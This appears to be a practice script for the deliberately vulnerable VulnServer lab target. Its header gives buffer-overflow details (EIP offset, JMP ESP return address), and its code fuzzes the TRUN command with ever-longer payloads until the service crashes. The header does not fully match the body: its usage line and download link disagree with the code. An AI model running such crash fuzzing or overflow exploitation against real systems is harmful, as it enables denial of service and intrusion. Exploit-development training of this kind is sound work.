# ---------------------------------------------------------------------------------------------#
# Target       =  VulnServer                                                                  #
# Download Link = https://github.com/DigitalDieter/Automate-Pentesting-with-Python                              #
# Date          = 04/08/2020                                                                  #
# Author        = @ihack4falafel                                                              #
# Tested on     = Python 3.6 Windows 7 - Ultimate                                             #
# EIP Offset    = 1040                                                                        #
# Badchars      = None                                                                        #
# RET Address   = 0x65d11d71 : "\xFF\xE4" | [VulnServer.exe]                                  #
# Usage         = python exploit.py <target IP>                                               #
# ---------------------------------------------------------------------------------------------#
import socket, sys
from time import sleep
HOST = "localhost"
#HOST = "192.168.0.49"
PORT = 9999

buffer = "A" * 100

while True:
    try:
        print("[*] Sending ", len(buffer), "bytes")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Declare a TCP socket
        s.connect((HOST, PORT))
        s.recv(1024)
        s.send(bytes('TRUN /.:/' + buffer, encoding='utf8'))
        s.close()
        buffer = buffer + "A" * 100
        sleep(0.5)
    except:
        print("Fuzzing crashed at %s bytes" % len(buffer))

        sys.exit()
